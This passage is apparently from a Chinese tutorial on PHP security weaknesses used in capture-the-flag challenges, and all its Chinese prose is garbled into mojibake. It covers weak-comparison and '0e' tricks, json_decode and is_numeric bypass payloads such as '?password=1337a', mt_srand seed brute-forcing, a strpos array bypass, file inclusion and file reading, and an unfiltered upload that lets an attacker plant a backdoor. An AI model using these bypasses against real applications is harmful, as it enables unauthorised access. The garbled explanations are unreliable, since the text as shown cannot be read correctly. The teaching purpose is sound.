ä¸ºå­—ç¬¦ä¸²å¼€å§‹æ²¡æœ‰åˆæ³•æ•°å€¼ï¼Œåˆ™å­—ç¬¦ä¸²root22è½¬æ¢ä¸º0ï¼Œæœ€å0==22,æ‰€ä»¥ä¸æˆç«‹ã€‚ var_dump('root22' == 0); //true//åˆ†æï¼šå…ˆå°†å­—ç¬¦ä¸²root22è½¬åŒ–æˆå’Œ0åŒç­‰ç±»å‹å³æ•°å­—å‹ï¼Œå› ä¸ºå­—ç¬¦ä¸²å¼€å§‹æ²¡æœ‰åˆæ³•æ•°å€¼ï¼Œåˆ™å­—ç¬¦ä¸²root22è½¬æ¢ä¸º0ï¼Œæœ€å0==0,æ‰€ä»¥æˆç«‹ã€‚ var_dump('0e170' == '0e180'); //true//åˆ†æï¼šå› ä¸ºå­—ç¬¦ä¸²ä¸­å«æœ‰eå¼€å¤´çš„å€¼ï¼Œé‚£ä¹ˆphpä»£ç ä¼šå°†å…¶æ•´ä½“çœ‹æˆç§‘å­¦è®°æ•°æ³•ï¼Œæœ€å0çš„170æ¬¡æ–¹==0çš„180æ¬¡æ–¹ï¼Œå³0==0,æ‰€ä»¥æˆç«‹ var_dump(0 === 'root'); //false//åˆ†æï¼š=== åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­ä¸¤è¾¹ç±»å‹æ˜¯å¦ç›¸ç­‰,è¿™é‡Œæ•°å€¼å’Œå­—ç¬¦ä¸²ç±»å‹æ˜æ˜¾ä¸ç­‰ï¼Œå› æ­¤ä¸æˆç«‹ var_dump (\"0e830400451993494058024219903391\" == 0); //true//åˆ†æï¼šå…ˆå°†å­—ç¬¦ä¸²0e830400451993494058024219903391è½¬åŒ–æˆå’Œ0åŒç­‰ç±»å‹å³æ•°å­—å‹ï¼Œå› ä¸ºå­—ç¬¦ä¸²å¼€å§‹æœ‰åˆæ³•æ•°å€¼ï¼Œåˆ™å­—ç¬¦ä¸²0e830400451993494058024219903391è½¬æ¢ä¸º0ï¼Œæœ€å0==0,æ‰€ä»¥æˆç«‹ã€‚ var_dump (\"0e830400451993494058024219903391\" == \"0e830400451993494058024219904444\"); //true//åˆ†æï¼šå…ˆå°†å­—ç¬¦ä¸²0e830400451993494058024219903391ä¸0e830400451993494058024219904444åˆ†åˆ«è½¬åŒ–æˆæ•°å­—å‹ï¼Œå› ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸²å¼€å§‹éƒ½æœ‰åˆæ³•æ•°å€¼ï¼Œåˆ™å­—ç¬¦ä¸²0e830400451993494058024219903391è½¬æ¢ä¸º0ï¼Œå­—ç¬¦ä¸²0e830400451993494058024219904444è½¬æ¢ä¸º0ï¼Œæœ€å0==0,æ‰€ä»¥æˆç«‹ã€‚ var_dump (0e830400451993494058024219903391 == 0e830400451993494058024219904444); //true//åˆ†æï¼šè¿™ä¸æ˜¯å­—ç¬¦ä¸²çš„æ¯”è¾ƒäº†ï¼Œè¿™æ˜¯æ•°å­—å‹çš„æ¯”è¾ƒï¼Œå› ä¸º==ä¸¤è¾¹çš„éƒ½æ˜¯ç§‘å­¦è®°æ•°æ³•0eï¼ˆ0çš„æ¬¡æ–¹ï¼‰ï¼Œæœ€ç»ˆ0=0 ?&gt; json_decode &lt;?php show_source(__FILE__); if (isset($_POST['message'])) { $message = json_decode($_POST['message']); $key =\"*********\"; if ($message-&gt;key == $key) { echo \"flag\"; } else { echo \"fail\"; } } else{ echo \"~~~~\"; } ?&gt; è¿ç”¨ bool æ¬ºéª—ï¼Œjson_decode å°† key å€¼è§£æä¸º bool ç±»å‹çš„ falseï¼Œpayload message={\"key\":0}ï¼Œ0ä¸å­—ç¬¦ä¸²è¿›è¡Œå¼±æ¯”è¾ƒï¼Œè‚¯å®šæ˜¯true intval intval() å‡½æ•°é€šè¿‡ä½¿ç”¨æŒ‡å®šçš„è¿›åˆ¶ base è½¬æ¢ï¼ˆé»˜è®¤æ˜¯åè¿›åˆ¶ï¼‰ï¼Œè¿”å›å˜é‡ var çš„ integer æ•°å€¼ã€‚tipsï¼šåœ¨è½¬æ¢æ—¶ï¼Œå‡½æ•°ä¼šä»å­—ç¬¦ä¸²èµ·å§‹å¤„è¿›è¡Œè½¬æ¢ç›´åˆ°é‡åˆ°ä¸€ä¸ªéæ•°å­—çš„å­—ç¬¦ï¼Œå³ä½¿å‡ºç°æ— æ³•è½¬æ¢çš„å­—ç¬¦ä¸²ä¹Ÿä¸ä¼šæŠ¥é”™è€Œæ˜¯è¿”å›0ï¼Œä»è€Œå¯ä»¥å¯¼è‡´å¦‚ä¸‹æƒ…å½¢çš„Bypass æ³¨ï¼š intval() ä¸èƒ½ç”¨äº objectï¼Œå¦åˆ™ä¼šäº§ç”Ÿ E_NOTICE é”™è¯¯å¹¶è¿”å› 1ï¼ˆæ³¨æ„è¿™ä¸ªé€šå¸¸é…åˆpreg_matchæ¥ä½¿ç”¨ï¼‰ int intval ( mixed $var [, int $base = 10 ] ) å‚æ•°è¯´æ˜ï¼š $varï¼šè¦è½¬æ¢æˆ integer çš„æ•°é‡å€¼ã€‚ $baseï¼šè½¬åŒ–æ‰€ä½¿ç”¨çš„è¿›åˆ¶ã€‚ å¦‚æœ baseä¸ºç©ºï¼Œé€šè¿‡æ£€æµ‹ var çš„æ ¼å¼æ¥å†³å®šä½¿ç”¨çš„è¿›åˆ¶ï¼š å¦‚æœå­—ç¬¦ä¸²åŒ…æ‹¬äº† â€œ0xâ€ (æˆ– â€œ0Xâ€) çš„å‰ç¼€ï¼Œä½¿ç”¨ 16 è¿›åˆ¶ (hex)ï¼› å¦åˆ™ï¼Œå¦‚æœå­—ç¬¦ä¸²ä»¥ â€œ0â€ å¼€å§‹ï¼Œä½¿ç”¨ 8 è¿›åˆ¶(octal)ï¼› å¦åˆ™ï¼Œå°†ä½¿ç”¨ 10 è¿›åˆ¶ (decimal)ã€‚ &lt;?php $a = $_GET['a']; if (intval($a) === 666) { $sql = \"Select a From Table Where Id=\".$a; echo $sql; } else { echo \"No...\"; } ?&gt; srand/mt_srand è¯­æ³•ï¼šsrand(seed) å’Œ mt_srand(seed) è‡ª PHP 4.2.0 èµ·ï¼Œä¸å†éœ€è¦ç”¨ srand() æˆ– mt_srand() ç»™éšæœºæ•°å‘ç”Ÿå™¨æ’­ç§ ï¼Œå› ä¸ºç°åœ¨æ˜¯ç”±ç³»ç»Ÿè‡ªåŠ¨å®Œæˆçš„ã€‚ä½†ä»–å´æœ‰ä¸ªç‰¹æ€§å°±æ˜¯ å½“è®¾ç½®å¥½ç§å­å å†é€šè¿‡mt_rand()ç”Ÿæˆå‡ºæ¥çš„éšæœºæ•°å°†ä¼šæ˜¯å›ºå®šçš„ã€‚ https://mp.weixin.qq.com/s/nVqkiMXyg2D_HtwLTkSgMA (double)microtime() åªæœ‰6ä½æœ‰æ•ˆæ•°å­—ï¼Œç§å­å–å€¼0,10,20,30,40,50,60,70,80,90,100~9999980,9999990 å…±100Wï¼Œç§å­å›ºå®šï¼Œç”Ÿæˆçš„éšæœºæ•°å›ºå®šå³ç”Ÿæˆçš„éšæœºå­—ç¬¦ä¸²å›ºå®šï¼Œå¯¼è‡´å¯çˆ†ç ´ is_numeric is_numeric()å‡½æ•°æ¥åˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºæ•°å­—ï¼Œæ˜¯æ•°å­—è¿”å›1ï¼Œä¸æ˜¯åˆ™è¿”å›0ã€‚æ¯”è¾ƒèŒƒå›´ä¸å±€é™äºåè¿›åˆ¶æ•°å­—ã€‚ &lt;?php error_reporting(0); $flag = \"flag{test}\"; $temp = $_GET['password']; is_numeric($temp)?die(\"no numeric\"):NULL; if($temp&gt;1336){ echo $flag; } ?&gt; ç»•è¿‡ï¼š?password=1337aæˆ–è€…?password=1337%00 16è¿›åˆ¶ä¼šè¢«åˆ¤æ–­ä¸ºæ•°å­— %00å³ç©ºæ ¼ä¼šè¢«åˆ¤æ–­ä¸ºéæ•°å­— 16è¿›åˆ¶ç»•è¿‡ï¼šis_numeric() ä¼šå¯¹ã€Œ16è¿›åˆ¶ã€ï¼ˆ0xå¼€å¤´ï¼‰è¿”å› true ã€‚æ•°å€¼å‹å’Œå­—ç¬¦å‹éƒ½å¯ä»¥ã€‚ var_dump(is_numeric(0x7e)); //bool(true) var_dump(is_numeric('0x7e')); //bool(true) ç»•è¿‡æ€è·¯ï¼šæŠŠ '1 or 1' è¿™ç±»payloadè½¬æˆ16è¿›åˆ¶ï¼Œå†ä¼ ç»™ is_numeric() ï¼Œå®ç°ç»•è¿‡ã€‚ ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ï¼šis_numeric() ä¼šå¯¹ã€Œç§‘å­¦è®¡æ•°æ³•ã€ï¼ˆ0eå¼€å¤´ï¼‰è¿”å› true ã€‚æ•°å€¼å‹å’Œå­—ç¬¦å‹éƒ½å¯ä»¥ã€‚å¹¶ä¸”ï¼Œ0eå¼€å¤´çš„å€¼ï¼Œå¼ºåˆ¶è½¬æ¢æˆintç±»å‹åï¼Œéƒ½æ˜¯1ã€‚ var_dump(is_numeric(0e123)); //bool(true) var_dump(is_numeric('0e123')); //bool(true) echo (int)is_numeric(0e123).PHP_EOL; //1 echo (int)is_numeric(0e9999).PHP_EOL; //1 echo (int)is_numeric('0e123'); //1 ç»•è¿‡æ€è·¯ï¼šé‡åˆ° (int)is_numeric($_GET['a']) è¿™ç±»æƒ…å†µæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¼ å…¥ 0exxx æ ¼å¼çš„å‚æ•°æ¥ç»•è¿‡ã€‚ å­—ç¬¦ä¸²ï¼šã€Œæ•°å­—ã€å’Œã€Œå­—æ¯ã€ç»„åˆçš„å­—ç¬¦ä¸²ï¼Œæ— è®ºæ˜¯å¦ä»¥æ•°å­—å¼€å¤´ï¼Œéƒ½è¿”å› falseã€‚ var_dump(is_numeric('1a')); //bool(false) var_dump(is_numeric('a1')); //bool(false) is_int()å’Œis_numeric()çš„åŒºåˆ« is_int() å’Œ is_numeric() éƒ½å¯ä»¥ â€œåˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºæ•°å­—â€ã€‚ ä½† is_int() å¿…é¡»æ˜¯ã€Œæ•´å½¢ã€æ‰è¿”å› true ï¼Œå…¶ä»–ç±»å‹éƒ½è¿”å› falseï¼› è€Œ is_numeric() å¯¹ã€Œæµ®ç‚¹å‹ã€ å’Œã€Œæ•°å€¼å‹å­—ç¬¦ä¸²ã€ä¹Ÿè¿”å› true ã€‚ var_dump(is_numeric(1.1)); //bool(true) var_dump(is_int(1.1)); //bool(false) var_dump(is_numeric('1')); //bool(true) var_dump(is_int('1')); //bool(false) type_digit()å’Œis_numeric()çš„åŒºåˆ« type_digit() å’Œ is_numeric() éƒ½å¯ä»¥ â€œåˆ¤æ–­å˜é‡æ˜¯å¦ä¸ºæ•°å­—â€ã€‚ ä½† type_digit() åªæœ‰åœ¨å­—ç¬¦ä¸²ä¸­å…¨æ˜¯ã€Œæ•°å­—ã€æ‰ä¼šè¿”å› true ï¼Œæ•´å‹ã€æµ®ç‚¹å‹ã€ç”šè‡³åŒ…å«æ­£è´Ÿç¬¦å·çš„å€¼éƒ½è¿”å› falseã€‚ è€Œ is_numeric() å¯¹æ•´å‹ã€æµ®ç‚¹å‹ã€ä»¥åŠåŒ…å«æ­£è´Ÿç¬¦å·çš„å€¼éƒ½è¿”å› true ã€‚ var_dump(is_numeric('1')); //bool(true) var_dump(ctype_digit('1')); //bool(true) var_dump(is_numeric(1)); //bool(true) var_dump(ctype_digit(1)); //bool(false) var_dump(is_numeric('1.1')); //bool(true) var_dump(ctype_digit('1.1')); //bool(false) var_dump(is_numeric('-1')); //bool(true) var_dump(ctype_digit('-1')); //bool(false) var_dump(is_numeric('+1')); //bool(true) var_dump(ctype_digit('+1')); //bool(false) strpos strpos() å‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚(å‡½æ•°è¿”å›æŸ¥æ‰¾åˆ°è¿™ä¸ªfindå­—ç¬¦ä¸²çš„ä½ç½®ï¼Œé‚£ä¹ˆå¦‚æœæ˜¯0ä½ç½®ï¼Œå°±å€¼å¾—æ³¨æ„äº†) **æ³¨é‡Šï¼š**strpos() å‡½æ•°æ˜¯åŒºåˆ†å¤§å°å†™çš„ã€‚ strpos(string,find,start) å‚æ•° æè¿° string å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚ find å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ã€‚ start å¯é€‰ã€‚è§„å®šå¼€å§‹æœç´¢çš„ä½ç½® å¯ä»¥æ•°ç»„ç»•è¿‡ &lt;?php $flag = \"flag\"; if (isset ($_GET['ctf'])) { if (@ereg (\"^[1-9]+$\", $_GET['ctf']) === FALSE) echo 'å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ'; else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo 'éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~'; } ?&gt; strpos()é‡åˆ°æ•°ç»„ï¼Œè¿”å›NULLï¼Œä¸FALSEç±»å‹ä¸åŒï¼Œifæ¡ä»¶æˆç«‹ ä¸è¿‡æœ‰çš„è¯´è¿˜å¯ä»¥%0aæ¢è¡Œç»•è¿‡ï¼Œä½†æˆ‘æš‚æ—¶æ²¡æ‰¾åˆ°ä¾‹å­ï¼ˆåº”ç”¨åœºæ™¯ï¼‰ï¼Œåªæ˜¯æœ‰ä¸ªdemo &lt;?php $flag = \"flag{success}\"; $i='666'; $ii=$_GET['h']; if(strpos($ii,$i,\"0\")){ echo $flag; } ?&gt; æ–‡ä»¶åŒ…å« PHPä¸­æä¾›äº†å››ä¸ªæ–‡ä»¶åŒ…å«çš„å‡½æ•°ï¼Œåˆ†åˆ«æ˜¯include()ã€include_once()ã€require()å’Œrequire_once()ã€‚è¿™å››ä¸ªå‡½æ•°éƒ½å¯ä»¥è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œä½†ä½œç”¨å¹¶ä¸ä¸€æ ·ã€‚ - includeï¼šæ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶æ—¶åªä¼šäº§ç”Ÿè­¦å‘Šï¼Œè„šæœ¬å°†ç»§ç»­æ‰§è¡Œã€‚ - include_onceï¼šå’Œinclude()è¯­å¥ç±»ä¼¼ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«ã€‚ - requireï¼šæ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶æ—¶ä¼šäº§ç”Ÿè‡´å‘½é”™è¯¯ï¼Œå¹¶åœæ­¢è„šæœ¬ã€‚ - require_onceï¼šå’Œrequire()è¯­å¥ç±»ä¼¼ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«ã€‚ å¸¸è§æ–‡ä»¶åŒ…å«getshellå¯å‚è€ƒï¼šæ–‡ä»¶åŒ…å«æ¼æ´å°ç»“ æµ…æphpæ–‡ä»¶åŒ…å«åŠå…¶getshellçš„å§¿åŠ¿ æ–‡ä»¶è¯»å– fileå‡½æ•° ç”¨fileå‡½æ•°è¯»å–çš„è¯ï¼Œè¯»å–çš„æ–‡ä»¶ä¼šä½œä¸ºæ•°ç»„è¿”å›ã€‚ &lt;?php $contents = file(\"hybcx.txt\"); foreach ($contents as $number =&gt; $content) { $fileNumber = $number + 1; echo \"{$fileNumber}: \" . $content; } ä¼ é€’ç»™fileå‡½æ•°çš„æ˜¯æ–‡ä»¶çš„è·¯å¾„ã€‚å°†æ–‡ä»¶çš„è·¯å¾„ä¼ é€’ç»™å¯¹æ–¹ï¼Œå¯¹æ–¹ä¼šè¯»å–æ–‡ä»¶å¹¶å°†å…¶æ’åˆ—åè¿”å›ã€‚(æ¢è¡Œçš„æ—¶å€™å°±è¿™æ ·) è¿”å›çš„æ–‡ä»¶çš„å†…å®¹çš„æ’åˆ—ç”¨foreachè¯­å¥æ˜¾ç¤ºã€‚ $numberå˜é‡æ˜¯æ•°ç»„çš„å…³é”®ã€‚å› ä¸ºæœ‰ä»0å¼€å§‹çš„å€¼ï¼Œæ‰€ä»¥ä½œä¸ºè¡Œå·ä½¿ç”¨ã€‚ $contentå˜é‡ä¼šä¸€è¡Œä¸€è¡Œåœ°è¾“å…¥è¯»å–çš„æ–‡ä»¶å†…å®¹ã€‚ å› ä¸º$numberå˜é‡æ˜¯ä»0å¼€å§‹çš„ï¼Œæ‰€ä»¥åŠ ä¸Š1ï¼Œä½œä¸ºä»1å¼€å§‹çš„è¡Œå·ã€‚è¿™æ¬¡æˆ‘ä»¬è¯»å–çš„æ˜¯æœ¬åœ°çš„æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šURLä½¿ç”¨Webä¸Šçš„æ–‡ä»¶ã€‚ readfileå‡½æ•° readfile å‡½æ•°æ˜¯ä¸€ä¸ªè¯»å–æ–‡ä»¶å¹¶ç«‹å³å°†å…¶å†™å…¥æ ‡å‡†è¾“å‡ºçš„å‡½æ•°ã€‚ &lt;?php readfile(\"hello.txt\"); æ‰§è¡Œæ—¶ï¼Œæ–‡ä»¶çš„å†…å®¹è¢«å†™å…¥æ ‡å‡†è¾“å‡ºã€‚å¦‚æœä½ åœ¨æ§åˆ¶å°è¿è¡Œå®ƒï¼Œæ–‡ä»¶çš„å†…å®¹å°†åŸæ ·è¾“å‡ºåˆ°æ§åˆ¶å°ã€‚ readfile å‡½æ•°ä¹Ÿå¯ç”¨äºåœ¨ç½‘ç»œä¸Šä¸‹è½½æ–‡ä»¶ å¦‚æœä½ è¿™æ ·å†™ï¼Œä½ è®¿é—®PHPæ–‡ä»¶çš„æ—¶å€™å°±å¯ä»¥ä¸‹è½½ä»»ä½•æ–‡ä»¶äº†ã€‚ &lt;?php $image = '1.png'; //è¿™é‡Œå¯ä»¥æ¢æˆæœ¬åœ°æˆ–è€…è¿œç¨‹æ–‡ä»¶åœ°å€ header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header(\"Cache-Control: no-cache, must-revalidate\"); header(\"Expires: 0\"); header('Content-Disposition: attachment; filename=\"'.basename($image).'\"'); header('Content-Length: ' . filesize($image)); header('Pragma: public'); readfile($image); file_get_contentså‡½æ•° file_get_contents å‡½æ•°è¯»å–æ–‡ä»¶å¹¶å°†å…¶ä½œä¸ºå­—ç¬¦ä¸²è¿”å›ã€‚ &lt;?php $contents = file_get_contents(\"hybcx.txt\"); var_dump($contents); ä¼ é€’çš„æ–‡ä»¶è·¯å¾„çš„å†…å®¹ä½œä¸ºå­—ç¬¦ä¸²è¿”å›åˆ° $contents å˜é‡ã€‚æˆ‘ä½¿ç”¨ var_dump å‡½æ•°è¾“å‡º $contents å˜é‡çš„å†…å®¹ã€‚å½“ç„¶ä¹Ÿå¯ä»¥æŒ‡å®šä¸€ä¸ª URL SplFileObject ç±» å°è¯•ä½¿ç”¨ SplFileObject ç±»è¯»å–æ–‡ä»¶çš„å†…å®¹ã€‚å¦‚æœæ‚¨æŒ‡å®šSplFileObject ç±»çš„æ–‡ä»¶è·¯å¾„ï¼Œå®ƒå°†è¿”å›ä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ã€‚ &lt;?php $file = new SplFileObject(\"hybcx.txt\"); foreach ($file as $number =&gt; $content) { $fileNumber = $number + 1; echo \"{$fileNumber}: \" . $content; } å½“æ‚¨æ–°å»º SplFileObject æ—¶ï¼Œå°†æ–‡ä»¶è·¯å¾„ä¼ é€’ç»™æ„é€ å‡½æ•°ï¼Œè¿™å°†è¿”å›ä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ã€‚æˆ‘ä»¬æ­£åœ¨æ¥æ”¶ $file å˜é‡ä¸­è¿”å›çš„æ–‡ä»¶å¯¹è±¡ã€‚ é€šè¿‡å°†å®ƒä¼ é€’ç»™ foreach è¯­å¥ï¼Œå®ƒå¯ä»¥åƒæ•°ç»„ä¸€æ ·ä½¿ç”¨ï¼Œç”±äº $number å˜é‡å­˜å‚¨äº†ä¸€ä¸ªä» 0 å¼€å§‹çš„æ•°å­—ï¼Œå®ƒå°†è¢«ç”¨ä½œè¡Œå·ã€‚ SplFileObject ç±»è¿˜å¯ä»¥ä½¿ç”¨ setFlags æ–¹æ³•è·³è¿‡ç©ºè¡Œã€‚è¿˜æœ‰è¯»å–CSVæ–‡ä»¶çš„è®¾ç½®ï¼Œè¯»å–CSVæ–‡ä»¶çš„æ—¶å€™ç”¨è¿™ä¸ªç±»ä¼šå¾ˆå¥½ã€‚ fread å‡½æ•° é€šè¿‡fopenå‡½æ•°è®¿é—®æ–‡ä»¶åå³å¯ä½¿ç”¨ã€‚ä»¥å­—ç¬¦ä¸²çš„å½¢å¼è·å–æ–‡ä»¶çš„å†…å®¹ã€‚ &lt;?php $filePath = \"hybcx.txt\"; $handle = fopen($filePath, \"r\"); $contents = fread($handle, filesize($filePath)); var_dump($contents); fclose($handle); fopenæ‰“å¼€æ–‡ä»¶ï¼Œä»¥åªè¯»æ–¹å¼æ‰“å¼€ï¼Œæ¥ç€ä½¿ç”¨freadè¯»å–æ–‡ä»¶å†…å®¹ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šæ–‡ä»¶èµ„æºï¼Œç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šè¯»å–çš„æ–‡ä»¶å¤§å° fgetså‡½æ•° è¿™ä¹Ÿåœ¨ä½¿ç”¨ fopen å‡½æ•°è®¿é—®æ–‡ä»¶åä½¿ç”¨ã€‚é€šè¿‡ä½¿ç”¨ fgets å‡½æ•°ï¼Œå¯ä»¥åƒæ–‡ä»¶å‡½æ•°ä¸€æ ·è¯»å–å’Œå¤„ç†æ¯ä¸€è¡Œã€‚ &lt;?php $filePath = \"hybcx.txt\"; $handle = fopen($filePath, \"r\"); $number = 1; while ($line = fgets($handle)) { echo \"ç¬¬{$number}è¡Œ: \" . $line; $number += 1; } fclose($handle); fgetså‡½æ•°å‚æ•°æ˜¯è¯»å–åˆ°çš„æ–‡ä»¶èµ„æºç±»å‹ï¼Œç„¶åfgetsè¯»å–ä¸€è¡Œï¼Œç„¶åå­˜å‚¨ä¸€è¡Œåœ¨lineå˜é‡ä¸­ å‡½æ•°/ç±» å†…å®¹ file é€è¡Œè¯»å–æ–‡ä»¶ readfile è¯»å–æ–‡ä»¶å¹¶ç«‹å³å†™å…¥æ ‡å‡†è¾“å‡º file_get_contents å°†æ•´ä¸ªæ–‡ä»¶ä½œä¸ºå­—ç¬¦ä¸²è¯»å– SplFileObject ä½¿ç”¨ç±»ï¼Œä»¥è¡Œä¸ºå•ä½è¯»å– fread ä½¿ç”¨fopenå‡½æ•°è·å–çš„èµ„æºï¼Œç”¨å­—ç¬¦ä¸²è¯»å–æ–‡ä»¶ fgets ä½¿ç”¨fopenå‡½æ•°è·å–çš„èµ„æºï¼Œä»¥è¡Œä¸ºå•ä½è¯»å–æ–‡ä»¶ fgetsså‡½æ•° ä¸fgetså‡½æ•°åŒºåˆ«ï¼šfgetss() å‡½æ•°ä»æ‰“å¼€çš„æ–‡ä»¶ä¸­è¿”å›ä¸€è¡Œï¼Œå¹¶è¿‡æ»¤æ‰ HTML å’Œ PHP æ ‡ç­¾ã€‚ä¼šåœ¨åˆ°è¾¾æŒ‡å®šé•¿åº¦æˆ–è¯»åˆ°æ–‡ä»¶æœ«å°¾ï¼ˆEOFï¼‰æ—¶ï¼ˆä»¥å…ˆåˆ°è€…ä¸ºå‡†ï¼‰ï¼Œåœæ­¢è¿”å›ä¸€ä¸ªæ–°è¡Œã€‚ &lt;?php print(sprintf(\"%'-10s%-'-30s\", '-', 'fopen fgetss').PHP_EOL); $file = fopen(\"hybcx.txt\",\"r\"); $number = 1; while($line = fgetss($file)){ echo \"ç¬¬{$number}è¡Œï¼š\", $line; $number += 1; } // è¿‡æ»¤æ‰äº† HTML å’Œ PHP æ ‡ç­¾ fclose($file); fpassthruå‡½æ•° å°†ç»™å®šçš„æ–‡ä»¶æŒ‡é’ˆä»å½“å‰çš„ä½ç½®è¯»å–åˆ° EOF å¹¶æŠŠç»“æœå†™åˆ°è¾“å‡ºç¼“å†²åŒºã€‚ &lt;?php header(\"Content-Type:text/html;charset=utf-8\"); $handle = fopen('hybcx.txt', 'r'); fseek($handle, 24);//å°†æŒ‡é’ˆå®šä½åˆ°1024å­—èŠ‚å¤„ fpassthru($handle); ?&gt; parse_ini_fileå‡½æ•° è½½å…¥ä¸€ä¸ªç”± filename æŒ‡å®šçš„ ini æ–‡ä»¶ï¼Œå¹¶å°†å…¶ä¸­çš„è®¾ç½®ä½œä¸ºä¸€ä¸ªè”åˆæ•°ç»„è¿”å›ã€‚ ä¾‹å¦‚simple.iniæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š ; This is a sample configuration file ; Comments start with ';', as in php.ini [first_section] one = 1 five = 5 animal = BIRD [second_section] path = \"/usr/local/bin\" URL = \"http://www.example.com/~username\" [third_section] phpversion[] = \"5.0\" phpversion[] = \"5.1\" phpversion[] = \"5.2\" phpversion[] = \"5.3\" &lt;?php define('BIRD', 'Dodo bird'); // Parse without sections $ini_array = parse_ini_file(\"sample.ini\"); print_r($ini_array); ?&gt; Array ( [one] =&gt; 1 [five] =&gt; 5 [animal] =&gt; Dodo bird [path] =&gt; /usr/local/bin [URL] =&gt; http://www.example.com/~username [phpversion] =&gt; Array ( [0] =&gt; 5.0 [1] =&gt; 5.1 [2] =&gt; 5.2 [3] =&gt; 5.3 ) ) show_sourceå‡½æ•° æ­¤å‡½æ•°æ˜¯highlight_fileçš„åˆ«åï¼šè¯­æ³•é«˜äº®ä¸€ä¸ªæ–‡ä»¶ï¼Œä½¿ç”¨PHPå†…ç½®çš„è¯­æ³•é«˜äº®å™¨æ‰€å®šä¹‰çš„é¢œè‰²ï¼Œæ‰“å°è¾“å‡ºæˆ–è€…è¿”å› filename æ–‡ä»¶ä¸­è¯­æ³•é«˜äº®ç‰ˆæœ¬çš„ä»£ç ã€‚ &lt;?php print(sprintf(\"%'-10s%-'-30s\", '-', 'show_source').PHP_EOL); show_source('hybcx.txt'); fgetc()å‡½æ•° PHP fgetc()å‡½æ•°ç”¨äºä»æ–‡ä»¶ä¸­è¯»å–å•ä¸ªå­—ç¬¦ã€‚ è¦ä½¿ç”¨fgetc()å‡½æ•°è·å–æ‰€æœ‰æ•°æ®ï¼Œè¯·åœ¨whileå¾ªç¯ä¸­ä½¿ç”¨!feof()å‡½æ•°ä½œä¸ºæ¡ä»¶ã€‚ &lt;?php $fp = fopen(\"hybcx.txt\", \"r\");//open file in read mode while(!feof($fp)) { echo fgetc($fp); } fclose($fp); ?&gt; ä¸Šé¢ä»£ç è¾“å‡ºç»“æœå¦‚ä¸‹ - æ–‡ä»¶ä¸Šä¼  move_uploaded_file æ­¤å‡½æ•°æ˜¯å°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°æ–°ä½ç½®ã€‚ move_uploaded_file(file,newloc) fileï¼šå¿…éœ€ã€‚è§„å®šè¦ç§»åŠ¨çš„æ–‡ä»¶ã€‚ newlocï¼šå¿…éœ€ã€‚è§„å®šæ–‡ä»¶çš„æ–°ä½ç½®ã€‚ $fileName = $_SERVER['DOCUMENT_ROOT'].'/uploads/'.$_FILES['file']['name']; move_uploaded_file($_FILES['file']['tmp_name'],$fileName ) è¿™æ®µä»£ç å°±æ˜¯ç›´æ¥æ¥æ”¶ä¸Šä¼ çš„æ–‡ä»¶ï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•çš„è¿‡æ»¤ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬ä¸Šä¼ getshellçš„åé—¨æ—¶ï¼Œå°±å¯ä»¥ç›´æ¥è·å–æƒé™ï¼Œå¯è§è¿™ä¸ªå‡½æ•°æ˜¯ä¸èƒ½ä¹±ç”¨çš„ï¼Œå³ä¾¿è¦ç”¨ä¹Ÿè¦å°†è¿‡æ»¤è§„åˆ™å®Œå–„å¥½ï¼Œé˜²æ­¢ä¸Šä¼ ä¸åˆæ³•æ–‡ä»¶ã€‚ æ–‡ä»¶åˆ é™¤ unlink æ­¤å‡½æ•°ç”¨æ¥åˆ é™¤æ–‡ä»¶ã€‚æˆåŠŸè¿”å› TURE ï¼Œå¤±è´¥è¿”å› FALSEã€‚ unlink(filename,context) filenameï¼šå¿…éœ€ã€‚è¦åˆ é™¤çš„æ–‡ä»¶ã€‚ contextï¼šå¯é€‰ã€‚å¥æŸ„ç¯å¢ƒã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œä¸€äº›ç½‘ç«™æ˜¯æœ‰åˆ é™¤åŠŸèƒ½çš„ã€‚æ¯”å¦‚å¸¸è§çš„è®ºå›ç½‘ç«™ï¼Œæ˜¯æœ‰åˆ é™¤è¯„è®ºæˆ–è€…æ–‡ç« åŠŸèƒ½çš„ã€‚å€˜è‹¥ç½‘ç«™æ²¡æœ‰å¯¹åˆ 